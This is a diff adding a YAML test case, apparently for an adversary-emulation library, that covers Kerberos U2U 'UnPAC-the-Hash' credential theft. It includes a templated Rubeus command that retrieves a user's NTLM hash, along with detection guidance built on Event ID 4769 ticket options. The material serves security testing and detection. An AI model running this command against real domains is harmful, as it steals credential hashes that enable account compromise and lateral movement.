@@ -1,0 +1,23 @@
+name: Hash retrieval via U2U UnPAC-the-Hash
+description: Perform a Kerberos U2U ticket request for the current user to retrieve a ticket containing their NTLM hash then recover the hash from the ticket.
+platforms:
+guidance:
+- cmd> Rubeus.exe asktgt /getcredentials /user:"{{ domain_user }}" /certificate:"{{ certificate_b64 }}" /password:"{{ certificate_password }}" /domain:"{{ domain_fqdn }}" /dc:"{{ domain_controller }}" /show
+block:
+- ''
+detect:
+- https://medium.com/falconforce/falconfriday-detecting-unpacing-and-shadowed-credentials-0xff1e-2246934247ce
+- Detect anomalous ticket requests containing ticket options used for U2U Kerberos requests (Forwardable, Renewable, Renewable_ok, Enc_tkt_in_skey) using Advanced Audit Kerberos ticket logs (Event ID 4769)
+controls:
+- SIEM
+- Identity Threat Protection
+metadata:
+  id: 7204324d-ea8e-428c-ab4d-060cc8b66f54
+  tid: T1558
+  tactic: TA0006
+  x_tools:
+  - https://github.com/GhostPack/Rubeus
+  x_references:
+  - https://www.thehacker.recipes/a-d/movement/kerberos/unpac-the-hash
+  x_vectr_id: 7204324d-ea8e-428c-ab4d-060cc8b66f54
+  isv: 1
